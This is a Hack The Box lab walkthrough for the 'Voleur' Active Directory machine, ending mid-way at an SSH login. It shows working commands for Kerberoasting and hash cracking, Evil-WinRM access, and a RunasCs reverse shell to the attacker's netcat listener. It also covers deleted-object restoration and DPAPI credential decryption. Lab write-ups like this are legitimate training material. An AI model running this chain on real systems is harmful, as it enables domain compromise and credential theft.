---
categories:
- Hackthebox
image:
  path: Pasted image 20251101011738.png
layout: post
media_subpath: /assets/images/voleur
tags:
- hackthebox
- windows
- active directory
- kerberos
- targeted kerberoasting
- dpapi
- credential dumping
- ad object restoration
- wsl
- lateral movement
- privilege escalation

title: Lab - Voleur Walkthrough
---

# Introduction
Voleur is a Windows Server 2022 domain controller that demonstrates multiple Active Directory attack vectors including Kerberos authentication bypass, targeted Kerberoasting, DPAPI credential extraction, and AD object restoration. The attack path leads from initial credential discovery to full domain compromise through a combination of privilege escalation techniques and backup exploitation.

## Reconnaissance

### Port Scanning

Initial `nmap` scan reveals standard AD services with an additional SSH service:

```
nmap -p53,88,135,139,389,445,593,636,2222,3268,5985 -sCV -oA nmap/voleur 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 21:22 EAT
Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 89.77% done; ETC: 21:23 (0:00:00 remaining)
Nmap scan report for dc.voleur.htb (10.10.11.76)
Host is up (0.36s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-08 02:22:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m14s
| smb2-time: 
|   date: 2025-07-08T02:23:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.86 seconds
```

**Key Findings:**
- Standard AD ports: 53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/636 (LDAP)
- SSH service on port 2222 (Ubuntu OpenSSH 8.2)
- Remote management: 5985 (WinRM)
- Domain: `voleur.htb`
Added domain to hosts file:

```
echo "10.10.11.76      dc.voleur.htb voleur.htb" | sudo tee -a /etc/hosts
```

## SMB Enumaration

Initial authentication attempts reveal NTLM is disabled, requiring Kerberos authentication:
Looking at the shares we have a non-default share `IT` which we have read access to 

```
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

**Accessible Shares:**
- `IT` (Read)
- `Finance` (No access)
- `HR` (No access)
User enumeration reveals several service accounts and technicians:

```
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --users                                    
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-          
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 19      Built-in account for administering the computer/domain
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 19      First-Line Support Technician
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 19      Second-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 19       
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 18      Third-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
```

**Notable Users:**
- Service accounts: `svc_ldap`, `svc_backup`, `svc_iis`, `svc_winrm`
- Support technicians with varying privilege levels

### Credential Discovery
SMB spidering reveals an encrypted Excel file in the IT share:

```
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k -M spider_plus                             
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/null/.nxc/modules/nxc_spider_plus
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
SPIDER_PLUS dc.voleur.htb   445    dc               [+] Saved share-file metadata to "/home/null/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json".
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Filtered Shares:  1
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  27
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    7
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    3.55 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        22 B
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        16.5 KB
```

The file `Access_Review.xlsx` is password protected.

![img](Pasted image 20250708053850.png)

Using `office2john` and cracking with rockyou:

```
office2john Access_Review.xlsx > access.hash
john access.hash --wordlist=/usr/share/wordlists/rockyou.txt
john access.hash --show                                     
Access_Review.xlsx:football1

1 password hash cracked, 0 left
```

**Credentials Found:**
- Password: `football1`
The decrypted document reveals user credentials and organizational structure.
![ima](Pasted image 20250708054208.png)

## Initial Access
### Kerberos Ticket Generation
Obtain TGT for BloodHound data collection:

```
impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.10.11.76
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache

export KRB5CCNAME=ryan.naylor.ccache 
```

### BloodHound Analysis
Dump BloodHound data for path analysis:

```
bloodhound-python -k -u ryan.naylor -p HollowOct31Nyt -c All --zip -ns 10.10.11.76 -d voleur.htb
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 43S
INFO: Compressing output into 20250708054625_bloodhound.zip
```

**Key Finding:** `svc_ldap` has outbound object control over `svc_winrm` and is member of `restore_users` group.
![image](Pasted image 20250708055221.png)
### Targeted Kerberoasting
Using `svc_ldap` credentials to perform targeted Kerberoasting:

```
git clone https://github.com/ShutdownRepo/targetedKerberoast
 
cd targetedKerberoast
 
python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb -p M1XyC9pW7qT5Vn
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$d04a29ed37910e405219bab6b14d98f0$83eace058ddfed59e9d04469d25889aee45c8c97b784bd98e9b12452df5f7de3886c96a2257cbcbdde5e33ec643773d08d7711ad2c0ad8a232e49511c13ce0e687449e99f33e752861cd7ec582ff1876bc26604aaf5d8f6c7e76c812066747a301f758cc7c65560e61d219a54e97c6873ecb85a9123b1c278414533aa245e9410ade6044318b07cbe4d88aaf3d3bff79f14ed0e2ef70e065e9f4764c52779ddc12d4fe0e7a1d220af5b314d6131594e3812ed14df1835432936b30c7abbe9afe556ae730a287163ad1bb5b5bc6be4e8b555f4ae60b58c68b0a12c7f8f6c97708355095e3831d2e8674a136566a5fa942b5404daa7d83e1a43e1e1adee4c4edaa263e3853242dba967cdb744388bbd775e8b4a464ab79aaee913a74302a163bde6b2f80470b29003afbd76b52d266004cc6b8a2d0303d5595c504c28d57f1ae7e42d4d30c7a25a3fdbefa2fe0b821a59aa603c6661b86b3695fd9cc9365d67c0f2ace525d892705b4b5d0d7a7993b8fd7d9e10d06304e9443a43bfe1a7e5ee2f0febf7fc21020cb22b09f27cd9547cb985edbaa8fc19b5a76ed73b4b2fddc1a3890f2fb00bb1de568ee63608cfd06912ec5c635524e7766f8975a6fe9ac99da9fe4fb0123a5a9e2dde66b3a6a84be0f1338d6d790c220e55d5174912ffa74af4e62640d11ffaf8aab221032f1b69175b8ba8462164d5aa3d258c5faaf8b93b84145f59c1a45da38f851fa04be5c1ac8e46f65a6e45868b4c887b5836b2de1ab68e70c05e06716d6899d3ef8e5b388e8d66fbbcea21c1ba850d11811f046f6dd1d9fc7a00adc8fa903de9bc976c261ceed26d6f7680ea1b9e61ac7dd63e527ade6e902026356d3485faeae32317f0adf03e32337c1b19096a457e67cb60026d818f6752e008f6eea101ff2973bf8bf5d86a6bd16cd4e79f95160c0b4be5bc5378b73a2d948e05fb485bdc5a82a1ff9b3945358b5e155e00d7c3019df7ced5f4e1906b15250e2547dd13d36274e31626726fe702f28b80628cbd8338755c3055ec9f9e2281dd722d53410be964c177e5dc8c51b6cff8c9421ff12885a50ea645bd336e8ab8cb88f7fe6efb6dc94aa3fd0b558af642101f5a6b3862c565f355a20a5d6ebf1db163107cb3a84a539766ebcbafbdefc12173119ffd395644da41083d2c62ac0f5cdc285467d9731267906463a38739cddf744bcc8e487f64364146038ea1717e49fa7f90a9933beee496d1802ceda2991c107042328ae1b27039f06fe18246926b9f85b162cd5ae6024304dd2cafdf29dfd28c7262211ff6850775a02a84b14caeb1419d12aa70204d7fcc4d4db76aea15eb695fd1bf5315efbcf639223cb103d440632e60066e3f854de198847f003f5e789f1dae417f768b2128601f402a934e0c571ed73813cb20d5152074dbe09db19a2c75d34bd42b4b47f87ca7423a3229d52a45798ff0dfd7ff986a35a4afa
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$033cba891ef8947d3db873343bf7b8aa$f3abab301cb3fe3f79ec5bfc29983ddab2eab9072cb2fa76060ee4137616ad08ec825ba5188eeece10a7ad0940c9de0f8525bbbbc4bada0d1f838918fda0b95694813f0430e99bc2d158fd95160e4d3434d64602faf62be1b09d0e24a4eba9a79805dbe29f097a268f352f8a6e2d5be6dac9c3a8f762a07fd09af3a52f14a41579246fb16694610b2c846d709649fe1e4b5740768221ca070cd9459e21b0804e0bf1e03386fe31987168e94b0b3e6be782b62fa6e5df636100df434514d2f9d95f0c872f27bc05f3061049d07431512c2a21d0102758a5aa368966567aaf446cf572202afa6a0c472b65ceca6635671e243acbff3e0ddce13a87c9affeaaaf6d2dc13a1c86bd84d80835bc42ccd11cdbecb38f2c037aebed90a7e41054e6ecf50ae2ebb8dba31da32e73e3c78a81fdf0ac02c8bec6655c353fb52c49e72100a8071b31eb51484348c65bdcec6b499b8efff1c366dfb4e5f14524220ad8495ff0c45ad67d4873b1eb58bdd9d1bbe0277680fb2a4ea796f6bbddbc39437abf166524575703360c2e85339fe04c235d42dbbf14662c8fdfe61b886c661f61f0e977d4e53bf814a01014d6469e2ba732c26ae0b77c45f430613201070f72c23159b0b5fedc586f253861772b1c376e5f1cd6f4299f391044f3c692b4f50f4332fd5f1e3c623db7296e8a6adbc34e8b56e00ae49f7643328b1e8a07e2355f4aabaac7ee334c27d4b3b9da055e39f7a8a63dbbe78448afe36529b5867a9e26f8c0abd171f9843b3ab26f3f2071535917aee25b08277d1d05219090c43a8f43846e1b5ec280693644e5b8bb2f3f6c974ba504878952af66e38495cd8f8ebde915250116beb11fa8cacd809b4cd9b5c0a92215562f5fa82b0497d23eee13d8b7c87c8149b5534bcbd8cf7806cff14dda50840554797ad0fb0bec1fb3bad25b5ac6590941cd07a9b05802c4319464b5e561a275db5f5a18abb7aeac8ccb6147fdad1e620c049488d57d6be960b3674d65324259dd49d3fc5c596ce492fe8f6f75efc897738b04c9c7da72b27984190e2f99c81b8ab7b761ab5dc8c51827680be49bf2e2c436f43ded9c5d3883a0a0eaf9211604ae6cbd990d6c2415ed99a62c0263b7fd7f6dd78b7e511c2db0499cbe9daff41581a46984c14256ffe0637f17f4429cca25a4e9b6f462b56946a42ae6adc3f88a505fd83d0ec8330f31112b837d0458fe29f42c5a7e1dcea0dc49e8047bbc7e87fbb31be64778cf1134f53229b950431484559e3465dc9cef5815d127f0ff19ab707cd23eb80a657c6531a2bf7fc50bb12a39637b0321f530c4020cf1b15256f0ef3ee0015cacd518ac9788d5d4f95292bc4957323d646256d789b766326a198cf43b6f78b11166ac769dc26694912525f226357d812e32fdeb29fb21a4a1e9ee5f7c06306b5de2ccc35403f6aa4b0f52122e3fcbf75f7c951cf7835f62e5accb97743882
```

Obtained and cracked `svc_winrm` TGS ticket:

```
hashcat  svc-winrm.hash /usr/share/wordlists/rockyou.txt
<snip>
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$23978f9ad62d52cf066d6df3d284f61e$ee917e0f32e7f3de88ef65e184c4c206b6fbb740135965585b0c5da19c306cfb8db2e7a042a6010c14c47856f10209db701a01ee9ede1c74c4ecede62f042b40c8b902dd2d594f48363c18e132d4f572334b2cd0e961af8e85de7125b4575dd0062398fc9c8639a8e37659ff587a366b060deee8cbf09d1960cf363bbc59317b06a00fccb1c6d0e698687d029ad09cbbc2b4c738339935822569eb7c2cadd3c84c85d3077728e22b5b78a59ef4202afdacd5d9df9f20032b341a640129cd9f63b0efea5ac3fb7b2087a94114c3a3fd1c3fcceb3ca3622822b2d3f2eeeaab24f76fe53945b42866696cf517980013dba7bf4c63807cd8abee16207402d65693e8957acc9ca0c5317296e141f58bd6ec1dfd82137a424dfa6623e5c1179bfa2cfd52f01cde969442c5e64617b62a2520b0ba6f1ef69879600f2e0ff7956d064c34440dd06e547cf61e93ae3a7f111d43fb4a3288cf2b9cb6bb3db3c7bf6ecdb657007c5d049479f5338145a11f6e99d4acdca478c708042a14045ae972ceeb64fce0e808dfef16d110cac0f10ea099121a643fe134192d912cf5eb07b74168496b1f574f886ad2a5d604186fa0104a90051251e700825f6f9e21ed40f44812ad570b32dc98b42ba3c46e9b91074fb60f5e3961574b40779babde81afca538d808ba7c7d6bd89f8b7939a9d407cd3b85b4b51c142b25dfa39f1cd76159b50410ad6f5f224c0c4f81621d326d091050c57f0f577b368b411b2ed0e3e0685c273a78e50762ecfbee0ec9441ac425ada638835beb00d5c7544fc2a1c3f7d5c0105558133297959678a106e0a565288893a546974b7b8cb51adf7b62b92ffc5cc8ec1e6881e9c537b7708829cf593017f678ba34871d3cc48824ae23951484f4abfa8af1ce912fe3db7b926672eb3fd9c994a66a59cd01092935d8d02443499658c59a6cd1c0812955704147af75499d7bf0dcd54693b7044af1beb7b09af31a976a7d7ca8ee9d5190af1238b96a8d4f3de2a7bdfba7fc04337b56b9e556451304e0d331c1b3b1a9c90bba0308063dafa52deecc04d57e4d21359c17c8c9884b3eeda500661aa434b0d2a201e0abddd9d1e902167896a0cfb57c8ccbece5307e73f884c1f6b784f82eaf2a54bd289ecc1c507bb3b5d3a31742adbdcf0bccc8111369f9f0aefb86655193a2c1476eaee51e77a93a0b91db10dd8892be01f68306b80f04f0aa3457d2dc4b34ece7aafe9a603e3f93ad0c9b1b4c5971e7837905b3b90c5f2d640fb08fde611803d9670125ab34d0fa121055149b9e5e567c9284ff4168a2ca391999237c1b7d42ace7c69f633e656c6c62b6220274a50de766deb46df3d98e605b860b2646163e7598b6e9ce9a2163e6766fee6240d47bfab70df4d731e22a6273789f1acd3a40c6d25d9e9d1fe25469538076421f988bb43ccf9ed96d0b291188a7cdd35e47dd4c4a448879d2192c09cb0:AFireInsidedeOzarctica980219afi
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...c09cb0
<snip>
```
**Credentials Found:**
- `svc_winrm:AFireInsidedeOzarctica980219afi`

### WinRM Access

```
impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -dc-ip 10.10.11.76
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

export KRB5CCNAME=svc_winrm.ccache

nxc smb dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k --generate-krb5-file krb5.conf
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 

export KRB5_CONFIG=$(pwd)/krb5.conf

evil-winrm -i dc.voleur.htb  -r voleur.htb                          
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

User flag located at: `C:\Users\svc_winrm\Desktop\user.txt`

## Lateral Movement
### AD Object Restoration
Discover deleted user `todd.wolfe`:

```
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List

Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List


Name            : Todd Wolfe
                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectGUID      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid       : S-1-5-21-3927696377-1337352550-2781715495-1110
lastKnownParent : OU=Second-Line Support Technicians,DC=voleur,DC=htb
```
Since `svc_ldap` is a member of restore users we can restore the deleted user todd. Using runas we get a shell as `svc_ldap`

```
*Evil-WinRM* PS C:\.tools> upload RunasCs.exe
                                        
Info: Uploading /home/null/LABS/HTB/Medium/Voleur/files/Runau/RunasCs.exe to C:\.tools\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!

.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.19:9001
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-18da93$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 6940 created in background.
*Evil-WinRM* PS C:\.tools> 

rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.76] 52564
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
PS C:\Windows\system32> 

```
Restore the deleted user using `svc_ldap` privileges:

```
PS C:\Windows\system32> Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```
## Credential Access via DPAPI
### Understanding DPAPI
**What is DPAPI?**  
DPAPI (Data Protection API) is a Windows cryptographic technology that provides OS-level data protection services. It's used by Windows to securely store:

- Browser passwords and form data
- Wi-Fi credentials
- RDP connection details
- Certificate private keys
- Microsoft Office passwords
- Many application credentials

**How DPAPI Works:**
1. **Master Keys**: Each user has master keys protected by their password
2. **Credential Files**: Applications store encrypted data in credential files
3. **Decryption**: Only the user (or SYSTEM) can decrypt their own DPAPI blobs
4. **Location**: Stored in `%APPDATA%\Microsoft\Protect\[SID]\[GUID]`
 
### Step-by-Step DPAPI Exploitation

#### Step 1: Access Todd Wolfe's Profile
After restoring `todd.wolfe`, we access his home directory through SMB: 

```
impacket-smbclient -k DC.VOLEUR.HTB
# use IT
# cd "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft"
# ls
```
**Directory Structure Found:**

```
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 Vault
```
#### Step 2: Download DPAPI Master Key

```
# cd Protect
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
-rw-rw-rw-        120  Wed Jan 29 16:13:50 2025 08949382-134f-4c63-b93c-ce52efc0aa88
# get 08949382-134f-4c63-b93c-ce52efc0aa88

```
**What we downloaded:**
- Master Key file: `08949382-134f-4c63-b93c-ce52efc0aa88`
- This is encrypted with the user's password hash

#### Step 3: Download Credential Files
Now we get the actual encrypted credentials:

```
# cd ..\..\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 18:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 16:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3

```
#### Step 4: Decrypt Master Key
We use `impacket-dpapi` with Todd's password to decrypt the master key:

```
impacket-dpapi masterkey -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**Key Points:**
- The SID (`S-1-5-21-3927696377-1337352550-2781715495-1110`) is Todd's user SID
- We use his password `NightT1meP1dg3on14` for decryption
- The output gives us the decrypted master key in hexadecimal

#### Step 5: Decrypt Credentials
Now we use the decrypted master key to decrypt the credential file:

```
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

### Technical Deep Dive

**Why This Works:**
1. **User Context**: We're running as `svc_ldap` which has access to Todd's profile
2. **Password Knowledge**: We have Todd's password from the Excel sheet
3. **DPAPI Chain**: User password → Master Key → Credential decryption
**The Decryption Chain:**

```
User Password → MD4 Hash → Decrypts Master Key → Decrypts Credential File
```

**File Locations Explained:**
- `Protect\SID\GUID`: Master keys (encrypted with user password)
- `Credentials\GUID`: Actual credential blobs (encrypted with master key)
- `Vault\`: Additional encrypted storage
### Alternative Methods

If we didn't have the password, we could also:
1. **Pass-the-Ticket**: Use Todd's TGT if available
2. **Mimikatz**: `dpapi::cred` with `/in:file` and `/masterkey:key`
3. **System Context**: If we had SYSTEM access, we could decrypt any user's DPAPI blobs

### Third-Line Support Access
With `jeremy.combs` credentials, access Third-Line Support share containing SSH keys:

```
impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip 10.10.11.76                             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
export KRB5CCNAME=jeremy.combs.ccache 

impacket-smbclient -k DC.VOLEUR.HTB
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 23:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 19:11:29 2025 Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 19:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 12:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 19:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 19:07:35 2025 Note.txt.txt
# mget *
[*] Downloading id_rsa
[*] Downloading Note.txt.txt
# 
```

The note reveals WSL backup configuration, and the SSH key is for `svc_backup`.

```
cat Note.txt.txt               
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin                                        

```
## Privilege Escalation
### Step 1: Discovering the /mnt Directory

Use the discovered SSH key to access the system via WSL:

```
chmod 600 id_rsa
ssh -i id_rsa svc_backup@voleur.htb -p 2222
The authenticity of host '[voleur.htb]:2222 ([10.10.11.76]:2222)' can't be established.
